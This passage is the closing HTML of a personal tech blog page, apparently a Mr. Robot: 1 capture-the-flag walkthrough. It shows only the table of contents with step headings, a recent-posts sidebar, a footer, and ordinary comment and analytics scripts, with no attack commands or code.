href="#3-6-%E5%88%87%E6%8D%A2%E5%88%B0-robot%EF%BC%8C%E8%AF%BB%E5%8F%96-key2"><span class="toc-text">3.6  切换到 robot，读取 key2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-%E6%8F%90%E6%9D%83%EF%BC%8C%E6%89%BE-key3"><span class="toc-text">3.7 提权，找 key3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Q%EF%BC%9A%E7%8E%B0%E5%9C%A8%E4%B8%8D%E8%83%BD-sudo%EF%BC%8C%E6%80%8E%E4%B9%88%E6%8F%90%E6%9D%83%EF%BC%9F"><span class="toc-text">Q：现在不能 sudo，怎么提权？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-1-Linux-%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">3.7.1  Linux 提权信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-2-Nmap-SUID-%E6%8F%90%E6%9D%83"><span class="toc-text">3.7.2 Nmap SUID 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q%EF%BC%9Ashell-%E8%A1%A5%E5%85%85"><span class="toc-text">Q：shell 补充</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88%E6%94%BE%E5%BC%83%E5%86%85%E6%A0%B8-exp-%E8%BF%99%E6%9D%A1%E8%B7%AF%EF%BC%9F"><span class="toc-text">四、为什么放弃内核 exp 这条路？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E4%BD%BF%E7%94%A8-MSF"><span class="toc-text">4.1 使用 MSF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8-searchsploit-%E6%9F%A5%E6%89%BE%E5%AF%B9%E5%BA%94%E6%BC%8F%E6%B4%9E"><span class="toc-text">1. 使用 searchsploit 查找对应漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Kali%E6%89%93%E5%BC%80msfconsole"><span class="toc-text">2. Kali打开msfconsole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%90%9C%E7%B4%A2MSF%E5%86%85%E5%AF%B9%E5%BA%94%E7%9A%84-overlayfs-%E6%A8%A1%E5%9D%97"><span class="toc-text">3. 搜索MSF内对应的 overlayfs  模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%8A%A0%E8%BD%BD%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%A8%A1%E5%9D%97"><span class="toc-text">5. 加载这个漏洞模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%9F%A5%E7%9C%8B%E6%A8%A1%E5%9D%97%E9%9C%80%E8%A6%81%E9%85%8D%E7%BD%AE%E7%9A%84%E9%80%89%E9%A1%B9"><span class="toc-text">6. 查看模块需要配置的选项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%BF%90%E8%A1%8C"><span class="toc-text">7. 运行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%8E%B7%E5%8F%96meterpreter%E4%BC%9A%E8%AF%9D"><span class="toc-text">8. 获取meterpreter会话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E6%8A%8A%E4%B9%8B%E5%89%8D%E7%9A%84%E5%86%8D%E6%89%A7%E8%A1%8C%E4%B8%80%E9%81%8D"><span class="toc-text">9. 把之前的再执行一遍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E5%85%88-kali-%E7%BC%96%E8%AF%91%EF%BC%8C%E5%86%8D%E8%AE%A9%E9%9D%B6%E6%9C%BA%E4%B8%8B%E8%BD%BD"><span class="toc-text">10. 先 kali 编译，再让靶机下载</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/09/11/Mr.Robot_1_Walkthrough/" title="Mr.Robot: 1 Walkthrough"><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/cover.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mr.Robot: 1 Walkthrough" loading='lazy'></a><div class="content"><a class="title" href="/2026/09/11/Mr.Robot_1_Walkthrough/" title="Mr.Robot: 1 Walkthrough">Mr.Robot: 1 Walkthrough</a><time datetime="2026-09-11T02:30:00.000Z" title="发表于 2026-09-11 10:30:00">2026-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/09/07/%E6%A2%A6%E4%B9%8B%E5%85%89%E8%8A%92%E7%9A%84%E5%B0%8F%E6%B8%B8%E6%88%8F/" title="梦之光芒的小游戏"><img src="https://img.jasmine-iris.top/posts/梦之光芒的小游戏/cover.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="梦之光芒的小游戏" loading='lazy'></a><div class="content"><a class="title" href="/2026/09/07/%E6%A2%A6%E4%B9%8B%E5%85%89%E8%8A%92%E7%9A%84%E5%B0%8F%E6%B8%B8%E6%88%8F/" title="梦之光芒的小游戏">梦之光芒的小游戏</a><time datetime="2026-09-07T15:25:00.000Z" title="发表于 2026-09-07 23:25:00">2026-09-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©&nbsp;2025 - 2026 By Jasmine_Iris</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div><div class="footer_custom_text"><a href="/atom.xml" target="_blank" rel="noopener">RSS 订阅</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = {"login":"force","emoji":["https://img.jasmine-iris.top/emoji/weibo","https://img.jasmine-iris.top/emoji/bilibili","https://img.jasmine-iris.top/emoji/qq","https://img.jasmine-iris.top/emoji/tieba","https://img.jasmine-iris.top/emoji/alus","https://img.jasmine-iris.top/emoji/bmoji"]}
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://waline.jasmine-iris.top',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline }
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script>if(document.getElementById("page-header")&&document.getElementById("page-header").classList.contains("full_page")){var bg=document.getElementById("web_bg");if(bg)bg.style.backgroundImage="url(/img/home-bg.png)";}</script><script>document.documentElement.classList.add(GLOBAL_CONFIG.pageType==='home'?'is-home':'not-home')</script><script>(function(){document.addEventListener('click',function(e){if(e.target.closest('.card-tag-cloud a, .article-tag-list a, .site-data a[href="/tags/"]')){e.preventDefault()}})})()</script><script src="/js/copy-guard.js?v=2"></script><script src="/js/copy-feedback.js?v=1"></script><script src="/js/cursor.js"></script><script>(function(){var article=document.getElementById('article-container'),cardToc=document.getElementById('card-toc');if(!article||!cardToc)return;var lastH=article.offsetHeight,t=null;function recalc(){if(Math.abs(article.offsetHeight-lastH)<=3)return;lastH=article.offsetHeight;clearTimeout(t);t=setTimeout(function(){window.dispatchEvent(new Event('resize'))},150)}if(window.ResizeObserver)new ResizeObserver(recalc).observe(article);document.addEventListener('load',recalc,true)})()</script><script src="/js/pv-post.js?v=1"></script><script src="/js/poem-card.js?v=2"></script><script src="/js/runtime-live.js?v=2"></script><script src="/js/scroll-reveal.js?v=1"></script><script src="/js/theme-switch.js?v=1"></script><script src="/js/context-menu.js?v=3"></script><script src="/js/console-art.js?v=1"></script><script src="/js/anti-devtools.js?v=1"></script><script src="/js/tab-title.js?v=1"></script><script src="/js/pangu.min.js?v=1"></script><script src="/js/pangu-init.js?v=1"></script><script src="/js/link-polish.js?v=1"></script><script>(function(){window.addEventListener('storage',function(e){if(e.key!=='theme'||!e.newValue)return;var v=e.newValue;try{var p=JSON.parse(e.newValue);if(p&&typeof p==='object')v=p.value}catch(_){}if(v!=='dark'&&v!=='light')return;if(document.documentElement.getAttribute('data-theme')===v)return;if(v==='dark'){if(window.btf&&window.btf.activateDarkMode)window.btf.activateDarkMode();else document.documentElement.setAttribute('data-theme','dark')}else{if(window.btf&&window.btf.activateLightMode)window.btf.activateLightMode();else document.documentElement.setAttribute('data-theme','light')}})})();</script><script>(() => {
+  const option = null
+  const config = {"site_uv":true,"site_pv":true,"page_pv":false,"token":"share-via-worker"}
+
+  const runTrack = () => {
+    if (typeof umami !== 'undefined' && typeof umami.track === 'function') {
+      umami.track(props => ({ ...props, url: window.location.pathname, title: GLOBAL_CONFIG_SITE.title }))
+    } else {
+      console.warn('Umami Analytics: umami.track is not available')
+    }
+  }
+
+  const loadUmamiJS = () => {
+    btf.getScript('https://umami.jasmine-iris.top/script.js', {
+      'data-website-id': 'ec777610-c4cf-493c-a333-c1dc46377957',
+      'data-auto-track': 'false',
+      ...option
+    }).then(() => {
+      runTrack()
+    }).catch(error => {
+      console.error('Umami Analytics: Error loading script', error)
+    })
+  }
+
+  const getData = async (isPost) => {
+    try {
+      const now = Date.now()
+      const keyUrl = isPost ? `&url=${window.location.pathname}&path=${window.location.pathname}` : ''
+      const headerList = { 'Accept': 'application/json' }
+
+      if (true) {
+        headerList['Authorization'] = `Bearer ${config.token}`
+      } else {
+        headerList['x-umami-api-key'] = config.token
+      }
+
+      const res = await fetch(`https://umami.jasmine-iris.top/api/websites/ec777610-c4cf-493c-a333-c1dc46377957/stats?startAt=0000000000&endAt=${now}${keyUrl}`, {
+        method: "GET",
+        headers: headerList
+      })
+
+      if (!res.ok) {
+        throw new Error(`HTTP error! status: ${res.status}`)
+      }
+
+      return await res.json()
+    } catch (error) {
+      console.error('Umami Analytics: Failed to fetch data', error)
+      throw error
+    }
+  }
+
+  const insertData = async () => {
+    try {
+      if (GLOBAL_CONFIG_SITE.pageType === 'post' && config.page_pv) {
+        const pagePV = document.getElementById('umamiPV')
+        if (pagePV) {
+          const data = await getData(true)
+          if (data && data.pageviews) {
+            pagePV.textContent = typeof data.pageviews.value !== 'undefined' ? data.pageviews.value : data.pageviews
+          } else {
+            console.warn('Umami Analytics: Invalid page view data received')
+          }
+        }
+      }
+
+      if (config.site_uv || config.site_pv) {
+        const data = await getData(false)
+
+        if (config.site_uv) {
+          const siteUV = document.getElementById('umami-site-uv')
+          if (siteUV && data && data.visitors) {
+            siteUV.textContent = typeof data.visitors.value !== 'undefined' ? data.visitors.value : data.visitors
+          } else if (siteUV) {
+            console.warn('Umami Analytics: Invalid site UV data received')
+          }
+        }
+
+        if (config.site_pv) {
+          const sitePV = document.getElementById('umami-site-pv')
+          if (sitePV && data && data.pageviews) {
+            sitePV.textContent = typeof data.pageviews.value !== 'undefined' ? data.pageviews.value : data.pageviews
+          } else if (sitePV) {
+            console.warn('Umami Analytics: Invalid site PV data received')
+          }
+        }
+      }
+    } catch (error) {
+      console.error('Umami Analytics: Failed to insert data', error)
+    }
+  }
+
+  btf.addGlobalFn('pjaxComplete', runTrack, 'umami_analytics_run_track')
+  btf.addGlobalFn('pjaxComplete', insertData, 'umami_analytics_insert')
+
+
+  loadUmamiJS()
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', insertData)
+  } else {
+    setTimeout(insertData, 100)
+  }
+})()</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索..." type="text"></div><hr><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
